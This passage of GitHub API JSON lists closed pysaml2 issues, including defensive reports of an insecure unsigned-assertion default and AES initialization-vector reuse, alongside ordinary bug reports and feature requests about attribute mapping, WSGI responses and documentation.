"MDQ6VXNlcjQ0MjU5", "avatar_url": "https://avatars3.githubusercontent.com/u/44259?v=4", "gravatar_id": "", "url": "https://api.github.com/users/terite", "html_url": "https://github.com/terite", "followers_url": "https://api.github.com/users/terite/followers", "following_url": "https://api.github.com/users/terite/following{/other_user}", "gists_url": "https://api.github.com/users/terite/gists{/gist_id}", "starred_url": "https://api.github.com/users/terite/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/terite/subscriptions", "organizations_url": "https://api.github.com/users/terite/orgs", "repos_url": "https://api.github.com/users/terite/repos", "events_url": "https://api.github.com/users/terite/events{/privacy}", "received_events_url": "https://api.github.com/users/terite/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": {"login": "jkakavas", "id": 10281256, "node_id": "MDQ6VXNlcjEwMjgxMjU2", "avatar_url": "https://avatars2.githubusercontent.com/u/10281256?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jkakavas", "html_url": "https://github.com/jkakavas", "followers_url": "https://api.github.com/users/jkakavas/followers", "following_url": "https://api.github.com/users/jkakavas/following{/other_user}", "gists_url": "https://api.github.com/users/jkakavas/gists{/gist_id}", "starred_url": "https://api.github.com/users/jkakavas/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jkakavas/subscriptions", "organizations_url": "https://api.github.com/users/jkakavas/orgs", "repos_url": "https://api.github.com/users/jkakavas/repos", "events_url": "https://api.github.com/users/jkakavas/events{/privacy}", "received_events_url": "https://api.github.com/users/jkakavas/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "jkakavas", "id": 10281256, "node_id": "MDQ6VXNlcjEwMjgxMjU2", "avatar_url": "https://avatars2.githubusercontent.com/u/10281256?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jkakavas", "html_url": "https://github.com/jkakavas", "followers_url": "https://api.github.com/users/jkakavas/followers", "following_url": "https://api.github.com/users/jkakavas/following{/other_user}", "gists_url": "https://api.github.com/users/jkakavas/gists{/gist_id}", "starred_url": "https://api.github.com/users/jkakavas/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jkakavas/subscriptions", "organizations_url": "https://api.github.com/users/jkakavas/orgs", "repos_url": "https://api.github.com/users/jkakavas/repos", "events_url": "https://api.github.com/users/jkakavas/events{/privacy}", "received_events_url": "https://api.github.com/users/jkakavas/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 6, "created_at": "2017-06-23T02:21:21Z", "updated_at": "2017-10-11T06:38:53Z", "closed_at": "2017-10-11T06:38:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "The the default value for `WantAssertionsSigned` is true in metadata, the default value for `want_assertions_signed` is false. While [the default value of false is documented](https://github.com/rohe/pysaml2/blob/master/doc/howto/config.rst#want-assertions-signed), the discrepancy gives a false sense of security.\r\n\r\nAdditionally and most importantly, **false is an exceptionally terrible default**. Allowing unsigned assertions is the type of issue that [costs companies _real money_ when found in a bug bounty](http://www.economyofmechanism.com/github-saml#signature-stripping) and is much more costly if found by a real attacker.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/422", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/422/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/422/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/422/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/422", "id": 235238027, "node_id": "MDU6SXNzdWUyMzUyMzgwMjc=", "number": 422, "title": "Attribute filtering based on friendly_names fail under certain conditions. ", "user": {"login": "jkakavas", "id": 10281256, "node_id": "MDQ6VXNlcjEwMjgxMjU2", "avatar_url": "https://avatars2.githubusercontent.com/u/10281256?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jkakavas", "html_url": "https://github.com/jkakavas", "followers_url": "https://api.github.com/users/jkakavas/followers", "following_url": "https://api.github.com/users/jkakavas/following{/other_user}", "gists_url": "https://api.github.com/users/jkakavas/gists{/gist_id}", "starred_url": "https://api.github.com/users/jkakavas/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jkakavas/subscriptions", "organizations_url": "https://api.github.com/users/jkakavas/orgs", "repos_url": "https://api.github.com/users/jkakavas/repos", "events_url": "https://api.github.com/users/jkakavas/events{/privacy}", "received_events_url": "https://api.github.com/users/jkakavas/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2017-06-12T13:46:22Z", "updated_at": "2017-07-11T11:52:57Z", "closed_at": "2017-07-11T11:52:57Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Attribute filtering (for example in [_match_attr_name](https://github.com/rohe/pysaml2/blob/master/src/saml2/assertion.py#L80) currently is performed with a basic assumption that all Service Providers will use the same friendlyName in the `<RequestedAttribute>` elements in their metadata, as pysaml2 internally uses to map OIDs to names in attributemaps (i.e. [here](https://github.com/rohe/pysaml2/blob/master/src/saml2/attributemaps/saml_uri.py)) .\r\n\r\nThis creates a problem in corner(?) cases where SPs select different friendly names than the ones one would expect. As an example an SP might use \r\n\r\n```xml\r\n<md:RequestedAttribute FriendlyName=\"surname\" Name=\"urn:oid:2.5.4.4\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\" isRequired=\"true\"/>\r\n```\r\n\r\nwhere the friendly name of `urn:oid:2.5.4.4` is `surname`. \r\nHowever, the same attribute is  [mapped](https://github.com/rohe/pysaml2/blob/master/src/saml2/attributemaps/saml_uri.py) as `sn` in pysaml2 and this would result in the attribute not being released, even though the value is available to a pysaml2 based Identity Provider. \r\n\r\nSince FriendlyName is not standardized and should not be used to formally identify attributes according to the [spec](https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf)\r\n\r\n> A string that provides a more human-readable form of the attribute's name, which may be useful in\r\ncases in which the actual Name is complex or opaque, such as an OID or a UUID. This attribute's value MUST NOT be used as a basis for formally identifying SAML attributes.\r\n\r\n we should probably base all filtering and matches to OIDs or the internal string representations which are statically controlled within pysaml2. ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/417", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/417/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/417/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/417/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/417", "id": 231078057, "node_id": "MDU6SXNzdWUyMzEwNzgwNTc=", "number": 417, "title": "Reuse of AES initialization vector in AESCipher / UsernamePasswordMako / Server", "user": {"login": "obi1kenobi", "id": 2348618, "node_id": "MDQ6VXNlcjIzNDg2MTg=", "avatar_url": "https://avatars2.githubusercontent.com/u/2348618?v=4", "gravatar_id": "", "url": "https://api.github.com/users/obi1kenobi", "html_url": "https://github.com/obi1kenobi", "followers_url": "https://api.github.com/users/obi1kenobi/followers", "following_url": "https://api.github.com/users/obi1kenobi/following{/other_user}", "gists_url": "https://api.github.com/users/obi1kenobi/gists{/gist_id}", "starred_url": "https://api.github.com/users/obi1kenobi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/obi1kenobi/subscriptions", "organizations_url": "https://api.github.com/users/obi1kenobi/orgs", "repos_url": "https://api.github.com/users/obi1kenobi/repos", "events_url": "https://api.github.com/users/obi1kenobi/events{/privacy}", "received_events_url": "https://api.github.com/users/obi1kenobi/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605568, "node_id": "MDU6TGFiZWw1NjA1NTY4", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/enhancement", "name": "enhancement", "color": "84b6eb", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 20, "created_at": "2017-05-24T15:21:53Z", "updated_at": "2018-08-02T12:05:21Z", "closed_at": "2018-08-02T12:05:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "The [Server](https://github.com/rohe/pysaml2/blob/4375361939e942c4dd666d3ca4e1159858404bc4/src/saml2/server.py#L91) class randomly generates a fixed 16-byte initialization vector (IV) for the purpose of encrypting data. Then, via the [UsernamePasswordMako](https://github.com/rohe/pysaml2/blob/4375361939e942c4dd666d3ca4e1159858404bc4/src/saml2/authn.py#L123) class, that fixed IV makes its way to the `AESCipher` class, where it is consistently reused for encrypting data.\r\n\r\nInitialization vector reuse like this is a security concern, since it leaks information about the encrypted data to attackers, regardless of the encryption mode used. For example, if the IV is reused with the same key in AES-CTR mode, the attacker will very likely be able to entirely decrypt the encrypted data: https://crypto.stackexchange.com/questions/2991/why-must-iv-key-pairs-not-be-reused-in-ctr-mode\r\n\r\nInstead of relying on a fixed, randomly-generated IV, it would be better to randomly-generate a new IV for every encryption operation. Here are a couple of links that have more information on why that is the preferred approach:\r\n- https://defuse.ca/cbcmodeiv.htm\r\n- https://crypto.stackexchange.com/questions/39615/best-way-to-generate-a-iv-for-aes-cbc-when-encrypting-files\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/413", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/413/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/413/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/413/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/413", "id": 226375093, "node_id": "MDU6SXNzdWUyMjYzNzUwOTM=", "number": 413, "title": "cherrypy wsgiserver moved to cheroot", "user": {"login": "catmeme", "id": 15038768, "node_id": "MDQ6VXNlcjE1MDM4NzY4", "avatar_url": "https://avatars3.githubusercontent.com/u/15038768?v=4", "gravatar_id": "", "url": "https://api.github.com/users/catmeme", "html_url": "https://github.com/catmeme", "followers_url": "https://api.github.com/users/catmeme/followers", "following_url": "https://api.github.com/users/catmeme/following{/other_user}", "gists_url": "https://api.github.com/users/catmeme/gists{/gist_id}", "starred_url": "https://api.github.com/users/catmeme/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/catmeme/subscriptions", "organizations_url": "https://api.github.com/users/catmeme/orgs", "repos_url": "https://api.github.com/users/catmeme/repos", "events_url": "https://api.github.com/users/catmeme/events{/privacy}", "received_events_url": "https://api.github.com/users/catmeme/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-05-04T18:52:22Z", "updated_at": "2017-11-15T14:29:20Z", "closed_at": "2017-11-15T14:29:20Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\nfrom cherrypy import wsgiserver\r\nImportError: cannot import name 'wsgiserver'\r\n```\r\n\r\nhttps://github.com/cherrypy/cherrypy/issues/1585\r\n\r\nhttp://docs.cherrypy.org/en/latest/history.html#v9-0-0", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/412", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/412/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/412/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/412/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/412", "id": 226271143, "node_id": "MDU6SXNzdWUyMjYyNzExNDM=", "number": 412, "title": "SAMLResponse decrypting - need an option to set ID_ATTR value for EncryptedKey", "user": {"login": "zshauli", "id": 27950788, "node_id": "MDQ6VXNlcjI3OTUwNzg4", "avatar_url": "https://avatars3.githubusercontent.com/u/27950788?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zshauli", "html_url": "https://github.com/zshauli", "followers_url": "https://api.github.com/users/zshauli/followers", "following_url": "https://api.github.com/users/zshauli/following{/other_user}", "gists_url": "https://api.github.com/users/zshauli/gists{/gist_id}", "starred_url": "https://api.github.com/users/zshauli/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zshauli/subscriptions", "organizations_url": "https://api.github.com/users/zshauli/orgs", "repos_url": "https://api.github.com/users/zshauli/repos", "events_url": "https://api.github.com/users/zshauli/events{/privacy}", "received_events_url": "https://api.github.com/users/zshauli/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605568, "node_id": "MDU6TGFiZWw1NjA1NTY4", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/enhancement", "name": "enhancement", "color": "84b6eb", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2017-05-04T12:53:34Z", "updated_at": "2018-08-03T21:58:19Z", "closed_at": "2018-08-03T21:58:19Z", "author_association": "NONE", "active_lock_reason": null, "body": "When decrypting a SAMLResponse, in CryptoBackendXmlSec1.decrypt() (in sigver.py), there is no option to set the value for the `--id-attr` command line argument.\r\n\r\nWhen trying to use the package with Okta's SSO implementation, I encounter the need to change the value from \"ID\" to \"Id\" in order for decryption to work. It is necessary for CryptoBackendXmlSec1.decrypt() to get id_attr as an input argument in order to successfully decrypt the SAMLResponse XML message.\r\n\r\nBasically this is because the tag EncrypedKey looks like this:\r\n`<xenc:EncryptedKey Id=\"_53352e5152dc817506c194a3624f95c9\" xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\">...</xenc:EncryptedKey>`", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/410", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/410/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/410/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/410/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/410", "id": 224402287, "node_id": "MDU6SXNzdWUyMjQ0MDIyODc=", "number": 410, "title": "Please document MDQ usage", "user": {"login": "bajnokk", "id": 9942990, "node_id": "MDQ6VXNlcjk5NDI5OTA=", "avatar_url": "https://avatars2.githubusercontent.com/u/9942990?v=4", "gravatar_id": "", "url": "https://api.github.com/users/bajnokk", "html_url": "https://github.com/bajnokk", "followers_url": "https://api.github.com/users/bajnokk/followers", "following_url": "https://api.github.com/users/bajnokk/following{/other_user}", "gists_url": "https://api.github.com/users/bajnokk/gists{/gist_id}", "starred_url": "https://api.github.com/users/bajnokk/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/bajnokk/subscriptions", "organizations_url": "https://api.github.com/users/bajnokk/orgs", "repos_url": "https://api.github.com/users/bajnokk/repos", "events_url": "https://api.github.com/users/bajnokk/events{/privacy}", "received_events_url": "https://api.github.com/users/bajnokk/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605568, "node_id": "MDU6TGFiZWw1NjA1NTY4", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/enhancement", "name": "enhancement", "color": "84b6eb", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-04-26T09:28:23Z", "updated_at": "2019-04-15T04:24:59Z", "closed_at": "2019-04-15T04:24:59Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi all,\r\n\r\napparently PySAML supports MDQ, but it is not mentioned in the documentation. I was able to get it working by the following config snippet:\r\n\r\n```\r\n  metadata:\r\n      mdq:\r\n          https://mdx.domain.com: null\r\n```\r\n\r\nI'm not sure if it's the correct one and I couldn't find a way to instruct PySAML to verify the signature of MDX server responses. Please extend the documentation to cover this.\r\n\r\nThank you!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/408", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/408/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/408/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/408/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/408", "id": 223085712, "node_id": "MDU6SXNzdWUyMjMwODU3MTI=", "number": 408, "title": "Allow to set NameIDPolicy AllowCreate value from config", "user": {"login": "johanlundberg", "id": 105702, "node_id": "MDQ6VXNlcjEwNTcwMg==", "avatar_url": "https://avatars3.githubusercontent.com/u/105702?v=4", "gravatar_id": "", "url": "https://api.github.com/users/johanlundberg", "html_url": "https://github.com/johanlundberg", "followers_url": "https://api.github.com/users/johanlundberg/followers", "following_url": "https://api.github.com/users/johanlundberg/following{/other_user}", "gists_url": "https://api.github.com/users/johanlundberg/gists{/gist_id}", "starred_url": "https://api.github.com/users/johanlundberg/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/johanlundberg/subscriptions", "organizations_url": "https://api.github.com/users/johanlundberg/orgs", "repos_url": "https://api.github.com/users/johanlundberg/repos", "events_url": "https://api.github.com/users/johanlundberg/events{/privacy}", "received_events_url": "https://api.github.com/users/johanlundberg/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2017-04-20T14:26:08Z", "updated_at": "2017-04-24T11:54:16Z", "closed_at": "2017-04-24T11:54:16Z", "author_association": "COLLABORATOR", "active_lock_reason": null, "body": "It would be great to be able to configure the AllowCreate attribute as supported by Format today in create_authn_request (https://github.com/rohe/pysaml2/blob/master/src/saml2/client_base.py#L205).\r\n\r\nI will create a PR for this (if someone doesn't beat me to it ;)) if there is no objections to the feature.\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/406", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/406/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/406/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/406/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/406", "id": 221037883, "node_id": "MDU6SXNzdWUyMjEwMzc4ODM=", "number": 406, "title": "saml2 httputil Response returns str type, not bytes as is required by the WSGI standard", "user": {"login": "MarcDufresne", "id": 599102, "node_id": "MDQ6VXNlcjU5OTEwMg==", "avatar_url": "https://avatars3.githubusercontent.com/u/599102?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MarcDufresne", "html_url": "https://github.com/MarcDufresne", "followers_url": "https://api.github.com/users/MarcDufresne/followers", "following_url": "https://api.github.com/users/MarcDufresne/following{/other_user}", "gists_url": "https://api.github.com/users/MarcDufresne/gists{/gist_id}", "starred_url": "https://api.github.com/users/MarcDufresne/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MarcDufresne/subscriptions", "organizations_url": "https://api.github.com/users/MarcDufresne/orgs", "repos_url": "https://api.github.com/users/MarcDufresne/repos", "events_url": "https://api.github.com/users/MarcDufresne/events{/privacy}", "received_events_url": "https://api.github.com/users/MarcDufresne/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-04-11T18:20:39Z", "updated_at": "2018-11-19T18:12:41Z", "closed_at": "2018-11-19T18:12:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "I have a WSGI server running pysaml2 and when using `saml2.httputil.Response` sub-classes (e.g. `NotFound`) I get the following error:\r\n\r\n```\r\n[2017-04-11 13:59:49 -0400] [36836] [ERROR] Error handling request\r\nTraceback (most recent call last):\r\n  File \".tox/py36/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 182, in handle_request\r\n    resp.write(item)\r\n  File \".tox/py36/lib/python3.6/site-packages/gunicorn/http/wsgi.py\", line 343, in write\r\n    raise TypeError('%r is not a byte' % arg)\r\nTypeError: 'message' is not a byte\r\n```\r\n`message` is the value of my response\r\n\r\nThis is the minimal code to trigger this issue:\r\n```py\r\n    def not_found(self, environ, start_response):\r\n        response = saml2.httputil.NotFound()\r\n        return response(environ, start_response)\r\n```\r\n\r\nI traced this error back to `saml2.httputil.Response#_response`, specifically, this part:\r\n\r\n```py\r\n        if isinstance(message, six.string_types):\r\n            return [message]  # << This doesn't return `bytes`, thus causing Gunicorn (WSGI server) to fail\r\n        elif isinstance(message, six.binary_type):\r\n            return [message]\r\n        else:\r\n            return message\r\n```\r\n\r\nChanging the line above to \r\n```py\r\nreturn [message.encode('utf-8')]  # returns bytes, Gunicorn is happy, request works\r\n```\r\nCaused my error to go away and my browser to show `message`, as expected\r\n\r\n---\r\n\r\nNow I feel like this is a big issue, so I am wondering if I am doing something wrong or somehow I'm the first one to stumble upon this issue.\r\n\r\nSystem Info:\r\n- Python version: python 3.6.1\r\n- Gunicorn version: 19.7.1\r\n- PySAML version: 4.4.0\r\n\r\nI can provide additional details as needed.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/405", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/405/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/405/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/405/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/405", "id": 219399755, "node_id": "MDU6SXNzdWUyMTkzOTk3NTU=", "number": 405, "title": "can't validate sha256 from adfs", "user": {"login": "dcripplinger", "id": 8252047, "node_id": "MDQ6VXNlcjgyNTIwNDc=", "avatar_url": "https://avatars3.githubusercontent.com/u/8252047?v=4", "gravatar_id": "", "url": "https://api.github.com/users/dcripplinger", "html_url": "https://github.com/dcripplinger", "followers_url": "https://api.github.com/users/dcripplinger/followers", "following_url": "https://api.github.com/users/dcripplinger/following{/other_user}", "gists_url": "https://api.github.com/users/dcripplinger/gists{/gist_id}", "starred_url": "https://api.github.com/users/dcripplinger/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/dcripplinger/subscriptions", "organizations_url": "https://api.github.com/users/dcripplinger/orgs", "repos_url": "https://api.github.com/users/dcripplinger/repos", "events_url": "https://api.github.com/users/dcripplinger/events{/privacy}", "received_events_url": "https://api.github.com/users/dcripplinger/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2017-04-04T22:10:14Z", "updated_at": "2017-08-01T18:35:29Z", "closed_at": "2017-08-01T18:35:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, this might be a long shot to figure out, but I'm desperate to find an answer somewhere. For the longest time, we've used pysaml2 and we've never been able to get it to work with idps using adfs unless we tell them to use sha1. Now we have someone that demands to use sha256 with their adfs. We have others that do sha256 with us successfully but not with adfs. We simply haven't been able to figure out why adfs sha256 fails signature validation. Does this sound at all similar to any known issues?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/403", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/403/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/403/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/403/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/403", "id": 218473583, "node_id": "MDU6SXNzdWUyMTg0NzM1ODM=", "number": 403, "title": "Please refrain from running ac_factory if not explicitly asked for", "user": {"login": "mrvanes", "id": 1901782, "node_id": "MDQ6VXNlcjE5MDE3ODI=", "avatar_url": "https://avatars0.githubusercontent.com/u/1901782?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mrvanes", "html_url": "https://github.com/mrvanes", "followers_url": "https://api.github.com/users/mrvanes/followers", "following_url": "https://api.github.com/users/mrvanes/following{/other_user}", "gists_url": "https://api.github.com/users/mrvanes/gists{/gist_id}", "starred_url": "https://api.github.com/users/mrvanes/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mrvanes/subscriptions", "organizations_url": "https://api.github.com/users/mrvanes/orgs", "repos_url": "https://api.github.com/users/mrvanes/repos", "events_url": "https://api.github.com/users/mrvanes/events{/privacy}", "received_events_url": "https://api.github.com/users/mrvanes/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2017-03-31T11:20:22Z", "updated_at": "2018-12-04T14:20:01Z", "closed_at": "2018-12-04T14:20:00Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I've been struggling with satosa failing internal atrribute mapping because pysaml2 had converted my incoming long SAML urn based attributes to shortnames before any custom attribute mapping was applied. This caused unexpected behaviour because I expected the internal mapping to be able to operate on original received long urn format attributes but was forced to map shortnames to internal representation instead.\r\nThis is unexpected, non standard behaviour and should preferably be disabled unless explicitly requested by config parameter like e.g. use_ac_factory_map.\r\n\r\nI fixed the problem by inserting a ```   acs = [] ``` just before ```   _acs = self.getattr(\"attribute_converters\", typ)``` in config.py@277 to simply circumvent the \"No attribute converters\" exception above.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/401", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/401/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/401/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/401/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/401", "id": 216414234, "node_id": "MDU6SXNzdWUyMTY0MTQyMzQ=", "number": 401, "title": "Response submit form shows submit button", "user": {"login": "mrvanes", "id": 1901782, "node_id": "MDQ6VXNlcjE5MDE3ODI=", "avatar_url": "https://avatars0.githubusercontent.com/u/1901782?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mrvanes", "html_url": "https://github.com/mrvanes", "followers_url": "https://api.github.com/users/mrvanes/followers", "following_url": "https://api.github.com/users/mrvanes/following{/other_user}", "gists_url": "https://api.github.com/users/mrvanes/gists{/gist_id}", "starred_url": "https://api.github.com/users/mrvanes/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mrvanes/subscriptions", "organizations_url": "https://api.github.com/users/mrvanes/orgs", "repos_url": "https://api.github.com/users/mrvanes/repos", "events_url": "https://api.github.com/users/mrvanes/events{/privacy}", "received_events_url": "https://api.github.com/users/mrvanes/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-03-23T12:40:12Z", "updated_at": "2017-10-30T08:40:59Z", "closed_at": "2017-10-30T08:40:59Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "While traversing through a SAML proxy (SATOSA) I noticed pysaml2 introduces a visible SAML Response form submit button which can/should(?) be masked by enclosing the ```<input type=\"submit\" value=\"Submit\" />``` element in ```<noscript>...</noscript>``` tags. This is how simpleSAMLphp solves the hidden Response POST submit.\r\n\r\nI fixed it by changing line 45 in src/saml2/pack.py to\r\n\r\n```<noscript><input type=\"submit\" value=\"Submit\" /></noscript>```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/397", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/397/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/397/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/397/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/397", "id": 214123397, "node_id": "MDU6SXNzdWUyMTQxMjMzOTc=", "number": 397, "title": "using this to login to existing saml enabled site", "user": {"login": "achapkowski", "id": 5131271, "node_id": "MDQ6VXNlcjUxMzEyNzE=", "avatar_url": "https://avatars1.githubusercontent.com/u/5131271?v=4", "gravatar_id": "", "url": "https://api.github.com/users/achapkowski", "html_url": "https://github.com/achapkowski", "followers_url": "https://api.github.com/users/achapkowski/followers", "following_url": "https://api.github.com/users/achapkowski/following{/other_user}", "gists_url": "https://api.github.com/users/achapkowski/gists{/gist_id}", "starred_url": "https://api.github.com/users/achapkowski/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/achapkowski/subscriptions", "organizations_url": "https://api.github.com/users/achapkowski/orgs", "repos_url": "https://api.github.com/users/achapkowski/repos", "events_url": "https://api.github.com/users/achapkowski/events{/privacy}", "received_events_url": "https://api.github.com/users/achapkowski/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605570, "node_id": "MDU6TGFiZWw1NjA1NTcw", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/question", "name": "question", "color": "cc317c", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2017-03-14T16:09:44Z", "updated_at": "2017-07-24T08:26:53Z", "closed_at": "2017-07-24T08:26:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "Can I leverage this package to login to a site that already is setup to use SAML based security?  \r\nI am having a bit of trouble figuring that out.\r\nIf so, can someone please point me to some docs on how to do that?\r\n\r\nThank you\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/391", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": 